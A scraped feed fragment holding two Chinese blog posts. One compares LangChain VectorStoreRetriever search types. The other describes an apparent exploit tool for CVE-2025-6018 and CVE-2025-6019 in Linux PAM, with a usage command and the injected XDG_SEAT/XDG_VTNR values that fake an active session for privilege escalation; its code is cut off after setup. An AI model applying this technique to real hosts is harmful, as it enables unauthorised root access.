</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VectorStoreRetriever 三种搜索类型]]></title>    <link>https://juejin.cn/post/7595289498445791258</link>    <guid>https://juejin.cn/post/7595289498445791258</guid>    <pubDate>2026-01-15T07:19:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595289498445791258" data-draft-id="7595351120667885594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VectorStoreRetriever 三种搜索类型"/> <meta itemprop="keywords" content="Python,LangChain"/> <meta itemprop="datePublished" content="2026-01-15T07:19:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sky1720"/> <meta itemprop="url" content="https://juejin.cn/user/791239358694760"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VectorStoreRetriever 三种搜索类型
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/791239358694760/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sky1720
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T07:19:20.000Z" title="Thu Jan 15 2026 07:19:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">VectorStoreRetriever 三种搜索类型深度解析：差异、场景与选型</h2>
<p>在 LangChain 等大模型应用开发中，<code>VectorStoreRetriever</code> 是连接向量数据库与大模型的核心组件，负责从知识库中精准召回与查询相关的文档。它支持三种核心搜索类型：<code>similarity</code>（默认）、<code>similarity_score_threshold</code>、<code>mmr</code>。</p>
<p>很多开发者在实际开发中会困惑：这三种搜索类型到底有什么区别？不同场景该选哪种？本文将从原理、参数、适用场景、实际效果四个维度，帮你彻底理清它们的差异，给出明确的选型建议。</p>
<h3 data-id="heading-1">一、先明确基础信息：三种搜索类型概览</h3>
<p>先通过一张表格快速掌握三种搜索类型的核心定义和默认参数：</p>

























<table><thead><tr><th>搜索类型</th><th>说明</th><th>默认参数</th></tr></thead><tbody><tr><td>similarity</td><td>相似度搜索（默认）</td><td>{"k": 4} - 返回前k个最相似的文档</td></tr><tr><td>similarity_score_threshold</td><td>带分数阈值的相似度搜索</td><td>{"k": 4, "score_threshold": 0.8} - 返回相似度大于阈值的文档</td></tr><tr><td>mmr</td><td>最大边际相关性搜索</td><td>{"k": 4, "fetch_k": 20, "lambda_mult": 0.5} - 平衡相关性和多样性</td></tr></tbody></table>
<h3 data-id="heading-2">二、深度拆解：三种搜索类型的核心差异</h3>
<h4 data-id="heading-3">1. similarity：纯相关性优先的基础搜索</h4>
<h5 data-id="heading-4">核心原理</h5>
<p>最基础的向量搜索逻辑：计算查询向量与知识库中所有文档向量的相似度（常用余弦相似度），按相似度从高到低排序，直接取前 <code>k</code> 个结果。</p>
<p>核心特点：只关注“相关性”，不考虑结果是否重复，也不设置任何筛选门槛。</p>
<h5 data-id="heading-5">参数解读</h5>
<p>仅需关注 <code>k</code>：代表最终返回的文档数量，默认值为4。无论文档相似度多低，只要排名在前k位，就会被返回（若知识库中文档不足k个，则返回全部）。</p>
<h5 data-id="heading-6">适用场景</h5>
<ul>
<li>简单问答场景：比如小型知识库的精准匹配，希望快速获取最相关的结果；</li>
<li>知识库特性：文档数量少、内容同质化低，几乎没有重复内容；</li>
<li>需求明确：对结果数量有硬性要求，不需要过滤低相关性内容。</li>
</ul>
<h5 data-id="heading-7">实际效果示例</h5>
<p>查询：「如何学习Python」</p>
<p>返回结果：相似度排名前4的文档，可能是「Python基础语法入门」「Python基础语法详解」「Python入门实战案例」「Python学习路径规划」—— 其中前两篇内容高度重复，但因相关性最高仍会被同时返回。</p>
<h4 data-id="heading-8">2. similarity_score_threshold：带门槛的精准搜索</h4>
<h5 data-id="heading-9">核心原理</h5>
<p>在纯相似度搜索的基础上，增加了“相似度阈值”筛选。流程是：先计算所有文档的相似度 → 过滤掉相似度低于 <code>score_threshold</code> 的文档 → 从剩余符合条件的文档中取前 <code>k</code> 个（若符合条件的文档不足k个，则返回全部符合条件的）。</p>
<p>核心特点：兼顾相关性和精准度，通过阈值过滤低质量、低相关性的“噪音文档”。</p>
<h5 data-id="heading-10">参数解读</h5>
<ul>
<li><code>k</code>：最终返回的最大文档数量，默认4；</li>
<li><code>score_threshold</code>：相似度阈值（范围0-1），值越高要求越严格，默认0.8。</li>
</ul>
<h5 data-id="heading-11">适用场景</h5>
<ul>
<li>高精准度要求场景：比如专业领域问答（医疗、法律、金融），不允许返回无关或擦边内容；</li>
<li>复杂知识库：知识库中存在大量无关文档，需要过滤噪音；</li>
<li>严格质量控制：比如客服机器人，必须保证回答的依据是高度相关的文档。</li>
</ul>
<h5 data-id="heading-12">实际效果示例</h5>
<p>查询：「如何学习Python」，设置 <code>score_threshold=0.8</code></p>
<p>返回结果：仅保留相似度≥0.8的文档。若符合条件的文档只有2篇（「Python基础语法入门」「Python学习路径规划」），则最终返回2篇，而非强制返回4篇。</p>
<h4 data-id="heading-13">3. mmr：平衡相关与多样的全面搜索</h4>
<h5 data-id="heading-14">核心原理</h5>
<p>MMR（Maximum Marginal Relevance，最大边际相关性）是一种进阶搜索算法，核心目标是“兼顾相关性和多样性”，避免返回内容重复的结果。具体流程：</p>
<ol>
<li>先从知识库中筛选出 <code>fetch_k</code> 个最相似的文档（作为候选集，默认20）；</li>
<li>从候选集中迭代选择文档：优先选与查询相关的，但同时尽量避免选与已选文档高度相似的；</li>
<li>通过 <code>lambda_mult</code> 调节权重：值越接近1，越偏向相关性；越接近0，越偏向多样性（默认0.5，均衡状态）。</li>
</ol>
<h5 data-id="heading-15">参数解读</h5>
<ul>
<li>
<p><code>k</code>：最终返回的文档数量，默认4；</p>
</li>
<li>
<p><code>fetch_k</code>：候选集大小（需≥k），候选集越大，可选的多样性文档越多；</p>
</li>
<li>
<p><code>lambda_mult</code>：平衡系数（0-1），默认0.5：</p>
<ul>
<li>lambda_mult=1：等价于纯similarity搜索（只看相关性）；</li>
<li>lambda_mult=0：完全追求多样性（可能忽略相关性，不推荐）。</li>
</ul>
</li>
</ul>
<h5 data-id="heading-16">适用场景</h5>
<ul>
<li>开放式问答场景：需要覆盖多角度答案，比如「Python学习方法有哪些」，希望同时获取基础语法、项目实战、书籍推荐、在线课程等不同维度的内容；</li>
<li>高重复度知识库：知识库中存在大量相似文档（如同一问题的不同版本回答），需要避免重复召回；</li>
<li>全面信息需求：比如用户需要了解某个主题的全貌，而非单一精准答案。</li>
</ul>
<h5 data-id="heading-17">实际效果示例</h5>
<p>查询：「如何学习Python」，设置 <code>lambda_mult=0.5</code></p>
<p>返回结果：不会出现多篇重复的基础语法文档，而是均衡返回「Python基础语法入门」「Python项目实战指南」「Python经典学习书籍推荐」「Python在线课程汇总」—— 兼顾相关性和多样性。</p>
<h3 data-id="heading-18">三、关键差异对比表（一目了然）</h3>









































<table><thead><tr><th>对比维度</th><th>similarity</th><th>similarity_score_threshold</th><th>mmr</th></tr></thead><tbody><tr><td>核心目标</td><td>仅追求最高相关性</td><td>高相关性 + 过滤低质量结果</td><td>相关性与多样性平衡</td></tr><tr><td>核心参数</td><td>k（返回数量）</td><td>k、score_threshold（阈值）</td><td>k、fetch_k（候选集）、lambda_mult（平衡系数）</td></tr><tr><td>结果特点</td><td>相关性最高，但可能重复</td><td>精准度高，无低相关结果</td><td>兼顾相关与多样，避免重复</td></tr><tr><td>适用场景</td><td>简单精准匹配、小型知识库</td><td>专业领域、高精准度需求</td><td>开放式问答、全面信息需求</td></tr><tr><td>结果数量</td><td>固定返回k个（不足则补全）</td><td>最多返回k个（可能更少）</td><td>固定返回k个</td></tr></tbody></table>
<h3 data-id="heading-19">四、选型建议：按场景快速决策</h3>
<p>掌握了差异后，实际开发中无需纠结，按以下原则快速选型：</p>
<ol>
<li>若需求简单、追求快速精准匹配，且知识库内容干净（无太多噪音）：选默认的 <code>similarity</code>；</li>
<li>若对结果精准度要求极高，不允许出现无关内容（如专业领域、客服机器人）：选 <code>similarity_score_threshold</code>，建议将 <code>score_threshold</code> 设为0.7-0.9（根据知识库实际情况调整）；</li>
<li>若需要覆盖多角度答案、避免重复内容（如开放式问答、主题全貌查询）：选 <code>mmr</code>，默认 <code>lambda_mult=0.5</code> 即可满足大部分场景，若需更侧重相关性可调至0.7-0.8。</li>
</ol>
<h3 data-id="heading-20">五、总结</h3>
<p>VectorStoreRetriever 的三种搜索类型，本质是为了适配不同的“召回需求”：</p>
<ul>
<li><code>similarity</code> 是基础款，主打“快准”；</li>
<li><code>similarity_score_threshold</code> 是精准款，主打“无噪音”；</li>
<li><code>mmr</code> 是进阶款，主打“全面性”。</li>
</ul>
<p>实际开发中，建议根据知识库的规模、内容特性以及用户的查询需求，灵活选择合适的搜索类型。如果不确定，也可以做小范围测试：用同一批查询对比三种类型的召回结果，再根据实际效果微调参数～</p>
<p>📌 本文配套代码示例（快速上手三种搜索类型）：</p>
<pre><code class="hljs language-ini" lang="ini">from langchain.vectorstores import Chroma
from langchain.embeddings import OpenAIEmbeddings

<span class="hljs-comment"># 初始化向量存储（示例）</span>
<span class="hljs-attr">embeddings</span> = OpenAIEmbeddings()
<span class="hljs-attr">vector_store</span> = Chroma(embedding_function=embeddings)

<span class="hljs-comment"># 1. similarity 搜索</span>
<span class="hljs-attr">retriever_similarity</span> = vector_store.as_retriever(
    <span class="hljs-attr">search_type</span>=<span class="hljs-string">"similarity"</span>,
    <span class="hljs-attr">search_kwargs</span>={<span class="hljs-string">"k"</span>: <span class="hljs-number">4</span>}
)

<span class="hljs-comment"># 2. similarity_score_threshold 搜索</span>
<span class="hljs-attr">retriever_threshold</span> = vector_store.as_retriever(
    <span class="hljs-attr">search_type</span>=<span class="hljs-string">"similarity_score_threshold"</span>,
    <span class="hljs-attr">search_kwargs</span>={<span class="hljs-string">"k"</span>: <span class="hljs-number">4</span>, <span class="hljs-string">"score_threshold"</span>: <span class="hljs-number">0.8</span>}
)

<span class="hljs-comment"># 3. mmr 搜索</span>
<span class="hljs-attr">retriever_mmr</span> = vector_store.as_retriever(
    <span class="hljs-attr">search_type</span>=<span class="hljs-string">"mmr"</span>,
    <span class="hljs-attr">search_kwargs</span>={<span class="hljs-string">"k"</span>: <span class="hljs-number">4</span>, <span class="hljs-string">"fetch_k"</span>: <span class="hljs-number">20</span>, <span class="hljs-string">"lambda_mult"</span>: <span class="hljs-number">0.5</span>}
)

<span class="hljs-comment"># 执行查询</span>
<span class="hljs-attr">query</span> = <span class="hljs-string">"如何学习Python"</span>
print(retriever_similarity.get_relevant_documents(query))
print(retriever_threshold.get_relevant_documents(query))
print(retriever_mmr.get_relevant_documents(query))
}
</code></pre>
<p>如果觉得本文对你有帮助，欢迎点赞、收藏～ 有任何疑问或补充，欢迎在评论区交流！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linux PAM环境变量注入漏洞利用工具解析]]></title>    <link>https://juejin.cn/post/7595056696518197267</link>    <guid>https://juejin.cn/post/7595056696518197267</guid>    <pubDate>2026-01-15T07:29:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595056696518197267" data-draft-id="7595167566143815699" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linux PAM环境变量注入漏洞利用工具解析"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2026-01-15T07:29:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linux PAM环境变量注入漏洞利用工具解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T07:29:23.000Z" title="Thu Jan 15 2026 07:29:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">项目标题与描述</h2>
<p>本项目提供了一个针对CVE-2025-6018漏洞的专业利用工具。该漏洞存在于Linux PAM（Pluggable Authentication Modules）的<code>pam_env.so</code>模块中，允许通过<code>~/.pam_environment</code>文件注入环境变量，进而通过SystemD会话操纵实现本地权限提升。结合CVE-2025-6019漏洞，攻击者可以进一步获得完整的root权限。</p>
<p>该工具通过SSH连接到目标主机，自动化执行漏洞检测和利用过程，支持openSUSE Leap 15、SUSE Linux Enterprise 15等多个Linux发行版。</p>
<h2 data-id="heading-1">功能特性</h2>
<ul>
<li><strong>自动化漏洞检测</strong>：自动检查目标系统上PAM的版本、配置文件顺序以及相关模块的存在情况。</li>
<li><strong>版本匹配验证</strong>：内置易受攻击的PAM版本列表（1.3.0 - 1.6.0），进行精确匹配。</li>
<li><strong>利用链执行</strong>：自动化实现CVE-2025-6018和CVE-2025-6019的完整攻击链，包括环境变量注入和后续权限提升。</li>
<li><strong>详细日志记录</strong>：将整个利用过程（包括时间戳、级别和信息）记录到文件并输出到控制台，便于分析和调试。</li>
<li><strong>参数化配置</strong>：支持通过命令行参数灵活指定目标IP、用户名和密码，易于集成到自动化工作流中。</li>
<li><strong>专业错误处理</strong>：包含SSH连接、命令执行和文件操作等环节的异常处理，提高工具的健壮性。</li>
</ul>
<h2 data-id="heading-2">安装指南</h2>
<h3 data-id="heading-3">系统要求</h3>
<ul>
<li>Python 3.x</li>
<li>操作系统：支持Python的任意操作系统（Linux, macOS, Windows等），用于作为攻击发起端。</li>
<li>目标系统：运行易受攻击版本（1.3.0 - 1.6.0）PAM的Linux主机。</li>
</ul>
<h3 data-id="heading-4">依赖安装</h3>
<p>本工具核心依赖为<code>paramiko</code>库（版本需&gt;=2.12.0）用于建立SSH连接。</p>
<p>使用pip安装依赖：</p>
<pre><code class="hljs language-bash" lang="bash">pip install paramiko&gt;=2.12.0
</code></pre>
<h3 data-id="heading-5">获取工具</h3>
<p>直接从提供的源代码文件开始使用，无需其他编译或构建步骤。确保您拥有<code>cve_2025_6018_professional.py</code>文件的执行权限。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">chmod</span> +x cve_2025_6018_professional.py
</code></pre>
<h2 data-id="heading-6">使用说明</h2>
<h3 data-id="heading-7">基础使用</h3>
<p>通过命令行参数指定目标主机信息并运行脚本：</p>
<pre><code class="hljs language-bash" lang="bash">python3 cve_2025_6018_professional.py -i 192.168.1.100 -u vulnerable_user -p user_password
</code></pre>
<h3 data-id="heading-8">参数详解</h3>
<ul>
<li><code>-i</code> 或 <code>--ip</code>: 目标主机的IP地址（必需）。</li>
<li><code>-u</code> 或 <code>--username</code>: 用于登录目标主机的用户名（必需）。</li>
<li><code>-p</code> 或 <code>--password</code>: 对应用户的密码（必需）。</li>
</ul>
<h3 data-id="heading-9">工作流程</h3>
<ol>
<li><strong>初始化与连接</strong>：工具初始化日志和漏洞版本数据，并尝试通过提供的凭据建立到目标主机的SSH连接。</li>
<li><strong>漏洞评估</strong>：在目标主机上执行一系列命令，检查PAM版本、<code>/etc/pam.d/</code>目录下的配置文件（特别是<code>sshd</code>）中<code>pam_env.so</code>和<code>pam_systemd.so</code>模块的顺序，以及SystemD版本。</li>
<li><strong>条件判断</strong>：如果检测到<code>pam_env.so</code>在<code>pam_systemd.so</code>之前被调用，并且PAM版本在受影响范围内，则判定存在漏洞。</li>
<li><strong>利用执行</strong>：如果存在漏洞，工具将尝试在用户目录下创建或修改<code>~/.pam_environment</code>文件，注入<code>XDG_SEAT=seat0</code>和<code>XDG_VTNR=1</code>等环境变量，以欺骗系统将其会话识别为本地活动会话。</li>
<li><strong>权限提升</strong>：利用伪造的“活动用户”身份，结合Polkit的<code>allow_active</code>策略，尝试执行需要特权（如挂载操作）的命令。如果系统中还存在CVE-2025-6019漏洞（涉及udisks2/libblockdev），则可能进一步利用该漏洞获得root shell。</li>
</ol>
<h3 data-id="heading-10">典型场景</h3>
<p>该工具主要用于渗透测试人员和安全研究人员在获得授权的前提下，对内部Linux系统进行安全评估，验证系统是否受此CVE影响以及实际风险等级。也可用于CTF（Capture The Flag）竞赛或安全教学演示本地权限提升漏洞的利用原理。</p>
<h2 data-id="heading-11">核心代码</h2>
<p>以下是工具中部分核心功能的代码实现及详细注释：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> paramiko
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> argparse
<span class="hljs-keyword">import</span> logging
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-comment"># 配置日志记录系统，将日志同时输出到文件和控制台，便于跟踪利用过程</span>
logging.basicConfig(
    level=logging.INFO,
    <span class="hljs-built_in">format</span>=<span class="hljs-string">'%(asctime)s [%(levelname)s] %(message)s'</span>,
    datefmt=<span class="hljs-string">'%Y-%m-%d %H:%M:%S'</span>,
    handlers=[
        logging.FileHandler(<span class="hljs-string">'cve_2025_6018_exploit.log'</span>),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CVEExploit</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># 定义已知易受攻击的PAM版本范围</span>
        self.vulnerable_versions = [
